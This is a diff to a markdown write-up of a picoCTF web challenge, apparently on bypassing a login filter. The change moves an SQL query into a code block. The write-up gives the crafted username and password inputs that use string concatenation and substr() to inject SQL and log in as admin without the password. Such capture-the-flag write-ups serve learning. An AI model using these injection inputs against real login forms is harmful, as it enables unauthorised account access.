@@ -45,7 +45,12 @@ Log in as admin Site: http://mercury.picoctf.net:57359/ Filter: http://mercury.p
 
 ![image](https://user-images.githubusercontent.com/70703371/176363696-8d5a7d8c-51b9-41e3-8c43-01709c3b3920.png)
 
-11. Change the query to this `SELECT username, password FROM users WHERE username='ad'||'min'||substr(' AND password=',0,0)||''`.
+11. Change the query to this:
+
+```sql
+SELECT username, password FROM users WHERE username='ad'||'min'||substr(' AND password=',0,0)||''
+```
+
 12. Based from the query, we fill the username as `ad'||'min'||substr(` and the password as `,0,0)||'`.
 
 ![image](https://user-images.githubusercontent.com/70703371/176365185-ec7b4757-f7c2-4417-a114-ab2bec0ab1cc.png)
